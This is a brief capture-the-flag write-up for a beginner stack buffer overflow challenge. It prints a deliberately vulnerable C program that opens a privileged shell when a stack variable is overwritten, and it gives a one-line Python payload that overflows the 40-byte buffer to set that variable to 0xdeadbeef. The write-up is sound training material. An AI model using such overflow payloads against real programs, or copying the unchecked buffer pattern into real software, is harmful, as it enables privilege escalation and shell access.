# ELF x86 - Stack buffer overflow basic 1

this challenge deals with a basic bufferoverflow

code
```
    #include <unistd.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <stdio.h>
     
    int main()
    {
     
      int var;
      int check = 0x04030201;
      char buf[40];
     
      fgets(buf,45,stdin);
     
      printf("\n[buf]: %s\n", buf);
      printf("[check] %p\n", check);
     
      if ((check != 0x04030201) && (check != 0xdeadbeef))
        printf ("\nYou are on the right way!\n");
     
      if (check == 0xdeadbeef)
       {
         printf("Yeah dude! You win!\nOpening your shell...\n");
         setreuid(geteuid(), geteuid());
         system("/bin/bash");
         printf("Shell closed! Bye.\n");
       }
       return 0;
    }


```

here the buffer is of 40 bytes and we have to modify the value of check to 0xdeadbeef to get the flag.So this can be done basically with dummy data of 40 bytes and passing 0xdeadbeef after that

payload
```
(python -c "print('A'*40+'\xef\xbe\xad\xde');cat") | ./ch13
```

here cat is used after the payload to stop the program at shell 
